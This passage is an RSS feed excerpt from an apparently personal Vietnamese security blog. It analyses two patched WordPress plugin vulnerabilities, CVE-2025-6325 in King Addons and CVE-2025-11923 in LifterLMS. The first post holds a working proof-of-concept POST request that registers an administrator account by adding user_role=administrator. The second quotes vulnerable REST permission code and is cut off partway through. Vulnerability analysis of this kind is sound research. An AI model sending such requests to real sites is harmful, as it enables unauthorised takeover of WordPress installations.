version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Unauthenticated User&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Submit Register Form (King Addons Login/Register Widget)&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;POST /wp-admin/admin-ajax.php&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;action=king_addons_user_register&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;wp_ajax_nopriv_king_addons_user_register&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Login_Register_Form_Ajax::handle_register_ajax()&amp;#34;]&#xA;&#xA;F --&amp;gt; G{&amp;#34;User Registration Enabled?&amp;#34;}&#xA;G -- No --&amp;gt; H[&amp;#34;Abort&amp;#34;]&#xA;G -- Yes --&amp;gt; I[&amp;#34;Read POST parameters&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;user_role taken directly from request&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Build user_data array&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;wp_insert_user(user_data)&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;WordPress assigns role from user_role&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;User account created with elevated role&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Submit form register v√† cho request ƒëi qua Burp Proxy&lt;/li&gt;&#xA;&lt;li&gt;Th√™m &lt;code&gt;user_role&lt;/code&gt; param v·ªõi gi√° tr·ªã &lt;code&gt;administrator&lt;/code&gt; v√†o request v√† g·ª≠i:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;&#xA;action=king_addons_user_register&amp;amp;nonce=2d3fdafcc0&amp;amp;email=abc%40gmail.com&amp;amp;username=abc&amp;amp;password=Hacker111%3F&amp;amp;confirm_password=Hacker111%3F&amp;amp;widget_id=c03756f&amp;amp;recaptcha_secret_key=&amp;amp;recaptcha_score_threshold=0.5&amp;amp;redirect_after_register=&amp;amp;terms_required=no&amp;amp;enable_user_email=yes&amp;amp;user_email_subject=Welcome&amp;#43;to&amp;#43;%7Bsite_name%7D!&amp;amp;user_email_content=Hello&amp;#43;%7Buser_name%7D%2C%0A%0AWelcome&amp;#43;to&amp;#43;%7Bsite_name%7D!%0A%0AYour&amp;#43;account&amp;#43;has&amp;#43;been&amp;#43;successfully&amp;#43;created.%0A%0AUsername%3A&amp;#43;%7Busername%7D%0AEmail%3A&amp;#43;%7Buser_email%7D%0A%0AThank&amp;#43;you&amp;#43;for&amp;#43;joining&amp;#43;us!%0A%0ABest&amp;#43;regards%2C%0A%7Bsite_name%7D&amp;#43;Team&amp;amp;enable_admin_email=no&amp;amp;admin_email_address=&amp;amp;admin_email_subject=&amp;amp;admin_email_content=&amp;amp;enable_mailchimp_integration=no&amp;amp;mailchimp_api_key=&amp;amp;mailchimp_list_id=&amp;amp;mailchimp_double_optin=no&amp;amp;auto_login_after_register=yes&amp;amp;user_role=administrator&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/result.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/result.png&#39; alt=&#34;Result&#34; height=&#34;662&#34; width=&#34;1544&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Login b·∫±ng t√†i kho·∫£n ƒë√£ t·∫°o&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/login.png&#34; title=&#34;Login&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/login.png&#34; data-sub-html=&#34;&lt;h2&gt;Login&lt;/h2&gt;&lt;p&gt;Login&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/login.png&#39; alt=&#34;Login&#34; height=&#34;740&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Login&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2025-6325&lt;/strong&gt; trong plugin &lt;strong&gt;King Addons for Elementor&lt;/strong&gt; cho ph√©p &lt;strong&gt;Privilege Escalation&lt;/strong&gt; th√¥ng qua form ƒëƒÉng k√Ω ng∆∞·ªùi d√πng. Nguy√™n nh√¢n ch√≠nh l√† gi√° tr·ªã &lt;code&gt;user_role&lt;/code&gt; ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ request m√† kh√¥ng ki·ªÉm tra tr∆∞·ªõc khi g√°n cho t√†i kho·∫£n m·ªõi. Phi√™n b·∫£n &lt;strong&gt;v51.1.14&lt;/strong&gt; v·∫´n ch·ª©a l·ªó h·ªïng n√†y, trong khi &lt;strong&gt;v51.1.36&lt;/strong&gt; ƒë√£ ƒë∆∞·ª£c v√°, do ƒë√≥ kh√¥ng th·ªÉ khai th√°c n·ªØa. Vi·ªác ph√¢n t√≠ch diff gi·ªØa c√°c phi√™n b·∫£n cho th·∫•y b·∫£n v√° gi·ªõi h·∫°n role ƒë∆∞·ª£c ph√©p v√† tr√°nh t√¨nh tr·∫°ng ng∆∞·ªùi d√πng g√°n role nguy hi·ªÉm nh∆∞ &lt;code&gt;administrator&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;L·ªó h·ªïng xu·∫•t ph√°t t·ª´ &lt;strong&gt;thi·∫øu ki·ªÉm so√°t input (untrusted input)&lt;/strong&gt; trong h√†m x·ª≠ l√Ω ƒëƒÉng k√Ω AJAX.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; cho ph√©p &lt;strong&gt;ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p&lt;/strong&gt; g·ª≠i request t·ªõi endpoint v√† khai th√°c l·ªó h·ªïng.&lt;/li&gt;&#xA;&lt;li&gt;B·∫£n v√° gi·ªõi h·∫°n danh s√°ch role ƒë∆∞·ª£c ph√©p (&lt;code&gt;subscriber&lt;/code&gt;, &lt;code&gt;customer&lt;/code&gt;) ƒë·ªÉ &lt;strong&gt;ngƒÉn leo thang ƒë·∫∑c quy·ªÅn&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Khi ph√¢n t√≠ch l·ªó h·ªïng, lu√¥n so s√°nh &lt;strong&gt;phi√™n b·∫£n vulnerable vs patched&lt;/strong&gt; ƒë·ªÉ x√°c ƒë·ªãnh thay ƒë·ªïi b·∫£o m·∫≠t.&lt;/li&gt;&#xA;&lt;li&gt;S·ª≠ d·ª•ng phi√™n b·∫£n &lt;strong&gt;c≈© (v51.1.14)&lt;/strong&gt; c√≥ th·ªÉ ph·ª•c v·ª• m·ª•c ƒë√≠ch ph√¢n t√≠ch ho·∫∑c PoC, nh∆∞ng kh√¥ng n√™n tri·ªÉn khai tr√™n m√¥i tr∆∞·ªùng production.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/king-addons/vulnerability/wordpress-king-addons-for-elementor-plugin-51-1-36-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress King Addons for Elementor Plugin &amp;lt;= 51.1.36 is vulnerable to a high priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-11923 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-02-cve-2025-11923/</link>
      <pubDate>Fri, 02 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-02-cve-2025-11923/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-02-cve-2025-11923/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin LifterLMS cho WordPress b·ªã l·ªó h·ªïng &lt;strong&gt;l·ªô th√¥ng tin nh·∫°y c·∫£m&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n t·ª´ tr∆∞·ªõc ƒë·∫øn &lt;strong&gt;9.1.0&lt;/strong&gt;, th√¥ng qua endpoint REST API &lt;strong&gt;/mcp/v1/&lt;/strong&gt;. L·ªó h·ªïng n√†y l√†m l·ªô &lt;strong&gt;Bearer Token&lt;/strong&gt; khi t√πy ch·ªçn &lt;strong&gt;‚ÄúNo-Auth URL‚Äù&lt;/strong&gt; ƒë∆∞·ª£c b·∫≠t. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng &lt;strong&gt;kh√¥ng c·∫ßn x√°c th·ª±c&lt;/strong&gt; l·∫•y ƒë∆∞·ª£c bearer token, t·ª´ ƒë√≥ c√≥ th·ªÉ truy c·∫≠p v√†o m·ªôt phi√™n l√†m vi·ªác h·ª£p l·ªá v√† th·ª±c hi·ªán nhi·ªÅu h√†nh ƒë·ªông nh∆∞ &lt;strong&gt;t·∫°o t√†i kho·∫£n qu·∫£n tr·ªã vi√™n m·ªõi&lt;/strong&gt;, d·∫´n ƒë·∫øn &lt;strong&gt;leo thang ƒë·∫∑c quy·ªÅn&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11923&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11923&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 9.1.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 9.1.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Student&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/lifterlms/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LifterLMS Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;LifterLMS&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;9.1.0&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;9.1.1&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function register_routes() {&#xA;    // $this-&amp;gt;namespace = &amp;#39;llms/v1&amp;#39;&#xA;    // $this-&amp;gt;rest_base = &amp;#39;students&amp;#39;&#xA;    register_rest_route(&#xA;        $this-&amp;gt;namespace,&#xA;        &amp;#39;/&amp;#39; . $this-&amp;gt;rest_base . &amp;#39;/(?P&amp;lt;id&amp;gt;[\d]&amp;#43;)&amp;#39;,&#xA;        array(&#xA;            &amp;#39;args&amp;#39;   =&amp;gt; array(&#xA;                &amp;#39;id&amp;#39; =&amp;gt; array(&#xA;                    &amp;#39;description&amp;#39; =&amp;gt; __( &amp;#39;Unique identifier for the resource.&amp;#39;, &amp;#39;lifterlms&amp;#39; ),&#xA;                    &amp;#39;type&amp;#39;        =&amp;gt; &amp;#39;integer&amp;#39;,&#xA;                ),&#xA;            ),&#xA;            ...&#xA;            array(&#xA;                &amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::EDITABLE, // POST, PUT, PATCH&#xA;                &amp;#39;callback&amp;#39;            =&amp;gt; array( $this, &amp;#39;update_item&amp;#39; ),&#xA;                &amp;#39;permission_callback&amp;#39; =&amp;gt; array( $this, &amp;#39;update_item_permissions_check&amp;#39; ),&#xA;                &amp;#39;args&amp;#39;                =&amp;gt; $this-&amp;gt;get_endpoint_args_for_item_schema( WP_REST_Server::EDITABLE ), // see class-wp-rest-controller.php.&#xA;            ),&#xA;            ...&#xA;            &amp;#39;schema&amp;#39; =&amp;gt; array( $this, &amp;#39;get_public_item_schema&amp;#39; ),&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;V·ªõi c·∫•u h√¨nh tr√™n, API ƒë∆∞·ª£c expose d∆∞·ªõi d·∫°ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-json/llms/v1/students/{id}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong ƒë√≥:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;(?P&amp;lt;id&amp;gt;[\d]+)&lt;/code&gt; l√† m·ªôt named regex group, WordPress s·∫Ω t·ª± ƒë·ªông parse gi√° tr·ªã n√†y v√† g√°n v√†o URL params.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;WP_REST_Server::EDITABLE&lt;/code&gt; t∆∞∆°ng ƒë∆∞∆°ng v·ªõi c√°c method: &lt;code&gt;POST&lt;/code&gt;, &lt;code&gt;PUT&lt;/code&gt;, &lt;code&gt;PATCH&lt;/code&gt; =&amp;gt; ƒëi·ªÅu n√†y y√™u c·∫ßu header &lt;code&gt;X-WP-Nonce&lt;/code&gt; trong request&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Khi c√≥ request g·ª≠i ƒë·∫øn endpoint n√†y v·ªõi method h·ª£p l·ªá, WordPress s·∫Ω g·ªçi &lt;code&gt;update_item()&lt;/code&gt;. Tuy nhi√™n, tr∆∞·ªõc khi h√†m n√†y ƒë∆∞·ª£c th·ª±c thi, request b·∫Øt bu·ªôc ph·∫£i v∆∞·ª£t qua b∆∞·ªõc ki·ªÉm tra quy·ªÅn th√¥ng qua &lt;code&gt;update_item_permissions_check()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function update_item_permissions_check( $request ) {&#xA;    if ( get_current_user_id() === $request[&amp;#39;id&amp;#39;] ) {&#xA;        return true;&#xA;    }&#xA;&#xA;    if ( ! current_user_can( &amp;#39;edit_students&amp;#39;, $request[&amp;#39;id&amp;#39;] ) ) {&#xA;        return llms_rest_authorization_required_error( __( &amp;#39;You are not allowed to edit this student.&amp;#39;, &amp;#39;lifterlms&amp;#39; ) );&#xA;    }&#xA;&#xA;    return $this-&amp;gt;check_roles_permissions( $request );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;T·∫°i d√≤ng 2, h√†m g·ªçi &lt;code&gt;get_current_user_id()&lt;/code&gt; ƒë·ªÉ l·∫•y ID c·ªßa user ƒëang ƒëƒÉng nh·∫≠p, sau ƒë√≥ so s√°nh v·ªõi gi√° tr·ªã &lt;code&gt;id&lt;/code&gt; ƒë∆∞·ª£c truy·ªÅn qua URL. N·∫øu hai gi√° tr·ªã n√†y tr√πng nhau, nghƒ©a l√† ng∆∞·ªùi d√πng ƒëang ch·ªânh s·ª≠a ch√≠nh t√†i kho·∫£n c·ªßa m√¨nh, v√† request ƒë∆∞·ª£c cho ph√©p ngay.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;get_current_user_id()&lt;/code&gt; ch·ªâ tr·∫£ v·ªÅ gi√° tr·ªã kh√°c &lt;code&gt;0&lt;/code&gt; khi request ƒë√£ ƒë∆∞·ª£c x√°c th·ª±c th√†nh c√¥ng. Vi·ªác x√°c th·ª±c n√†y ph·ª• thu·ªôc v√†o vi·ªác request c√≥ k√®m theo &lt;code&gt;X-WP-Nonce&lt;/code&gt; h·ª£p l·ªá hay kh√¥ng. Nguy√™n nh√¢n l√† v√¨ trong qu√° tr√¨nh x·ª≠ l√Ω REST API, WordPress 